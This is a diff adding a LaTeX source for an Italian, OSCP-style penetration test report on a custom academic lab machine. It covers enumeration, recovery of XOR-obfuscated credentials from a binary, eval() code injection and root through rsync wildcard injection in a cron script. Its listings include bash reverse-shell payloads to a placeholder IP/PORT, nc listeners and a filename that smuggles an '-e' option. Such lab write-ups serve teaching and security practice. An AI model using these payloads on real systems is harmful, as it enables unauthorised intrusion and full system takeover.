@@ -1,0 +1,267 @@
+\documentclass[a4paper,11pt]{article}
+
+% -------------------- PACKAGES --------------------
+\usepackage[margin=2.5cm]{geometry}
+\usepackage{hyperref}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{setspace}
+\usepackage{titlesec}
+
+% -------------------- CONFIG --------------------
+\onehalfspacing
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=black,
+    urlcolor=blue
+}
+
+\titleformat{\section}{\large\bfseries}{\thesection}{1em}{}
+\titleformat{\subsection}{\normalsize\bfseries}{\thesubsection}{1em}{}
+
+\lstset{
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    frame=single,
+    backgroundcolor=\color{gray!10}
+}
+
+\title{\textbf{Penetration Test Report (OSCP Style)}\\Custom Internal Lab}
+\author{Franco Salvucci}
+\date{}
+
+\begin{document}
+
+\maketitle
+\tableofcontents
+\newpage
+
+% --------------------------------------------------
+\section{Informazioni sul Target}
+
+\begin{itemize}
+    \item \textbf{Indirizzo IP:} 10.0.2.5
+    \item \textbf{Ambiente:} Laboratorio accademico (Custom Machine)
+\end{itemize}
+
+% --------------------------------------------------
+\section{Enumerazione}
+
+\subsection{Scoperta del target}
+
+All’interno della rete locale, il target è stato identificato tramite scansione ARP:
+
+\begin{lstlisting}
+nmap -sn 10.0.2.0/24
+\end{lstlisting}
+
+\subsection{Scansione delle porte}
+
+\begin{lstlisting}
+nmap -sC -sV 10.0.2.5
+\end{lstlisting}
+
+\textbf{Porte aperte:}
+
+\begin{itemize}
+    \item 22/tcp – SSH
+    \item 80/tcp – HTTP
+    \item 443/tcp – HTTPS
+    \item 8080, 8081, 8082 – Web services
+\end{itemize}
+
+% --------------------------------------------------
+\subsection{Enumerazione Web}
+
+Accedendo al servizio HTTP si osserva una pagina di default nginx.
+
+Viene eseguito brute forcing delle directory:
+
+\begin{lstlisting}
+gobuster dir -u http://10.0.2.5 \
+-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+\end{lstlisting}
+
+Tra i risultati emerge l’endpoint:
+
+\begin{lstlisting}
+/connector
+\end{lstlisting}
+
+Il file viene scaricato per analisi:
+
+\begin{lstlisting}
+wget http://10.0.2.5/connector
+\end{lstlisting}
+
+% --------------------------------------------------
+\section{Reverse Engineering}
+
+\subsection{Analisi del binario}
+
+Il file \texttt{connector} è stato analizzato con Ghidra.
+
+Dall’analisi emerge:
+\begin{itemize}
+    \item presenza della funzione \texttt{cryptHelper}
+    \item confronto con variabili globali
+\end{itemize}
+
+Le variabili globali contengono dati offuscati tramite XOR.
+
+\subsection{Estrazione dei dati}
+
+I byte sono stati esportati in formato Python e utilizzati per effettuare il de-XOR.
+
+Esempio:
+
+\begin{lstlisting}
+[0x30, 0x0d, 0x13, 0x2e, 0x09, ...]
+\end{lstlisting}
+
+\subsection{Credenziali ottenute}
+
+\begin{itemize}
+    \item Username: developer
+    \item Password: ********
+\end{itemize}
+
+% --------------------------------------------------
+\section{Accesso Iniziale}
+
+\subsection{Virtual Host Discovery}
+
+Dall’enumerazione TLS emerge il dominio:
+
+\begin{lstlisting}
+robot.vdsi
+\end{lstlisting}
+
+Aggiunto al file hosts:
+
+\begin{lstlisting}
+/etc/hosts
+\end{lstlisting}
+
+Enumerazione vhost:
+
+\begin{lstlisting}
+gobuster vhost -u http://robot.vdsi -w wordlist
+\end{lstlisting}
+
+Individuato:
+
+\begin{itemize}
+    \item calculator.robot.vdsi
+\end{itemize}
+
+% --------------------------------------------------
+\subsection{Autenticazione}
+
+Le credenziali precedentemente ottenute permettono l’accesso.
+
+% --------------------------------------------------
+\subsection{Code Injection}
+
+Analizzando il comportamento dell’applicazione, si sospetta l’utilizzo della funzione \texttt{eval()}.
+
+Payload utilizzato:
+
+\begin{lstlisting}
+__import__('os').system("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'")
+\end{lstlisting}
+
+Listener:
+
+\begin{lstlisting}
+nc -lvnp 4444
+\end{lstlisting}
+
+\textbf{Risultato:} accesso come utente \texttt{blunder}
+
+% --------------------------------------------------
+\section{Post-Exploitation}
+
+\subsection{Stabilizzazione della shell}
+
+\begin{lstlisting}
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+\end{lstlisting}
+
+% --------------------------------------------------
+\section{Privilege Escalation}
+
+\subsection{Analisi del sistema}
+
+Nel sistema è presente una directory:
+
+\begin{lstlisting}
+/backup_container
+\end{lstlisting}
+
+Contiene:
+\begin{itemize}
+    \item script backup.sh
+    \item cronjob
+\end{itemize}
+
+\subsection{Analisi dello script}
+
+Lo script utilizza:
+
+\begin{lstlisting}
+rsync -a *
+\end{lstlisting}
+
+Questo comportamento è vulnerabile a wildcard injection.
+
+% --------------------------------------------------
+\subsection{Sfruttamento}
+
+1. Creazione payload:
+
+\begin{lstlisting}
+echo "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'" > shell.sh
+\end{lstlisting}
+
+2. Creazione file malevolo:
+
+\begin{lstlisting}
+touch -- '-e sh shell.sh'
+\end{lstlisting}
+
+3. Attesa esecuzione cron
+
+Listener:
+
+\begin{lstlisting}
+nc -lvnp 4444
+\end{lstlisting}
+
+\textbf{Risultato:} shell come \texttt{root}
+
+% --------------------------------------------------
+\section{Proof of Compromise}
+
+\subsection{Root Access}
+
+\begin{lstlisting}
+whoami
+root
+\end{lstlisting}
+
+% --------------------------------------------------
+\section{Conclusioni}
+
+La compromissione del sistema è stata possibile grazie alla combinazione di:
+
+\begin{itemize}
+    \item Reverse engineering di un binario esposto
+    \item Vulnerabilità di code injection
+    \item Errata configurazione di script di backup
+\end{itemize}
+
+La catena di attacco richiede competenze intermedie ed evidenzia gravi carenze di sicurezza a livello applicativo e di sistema.
+
+\end{document}
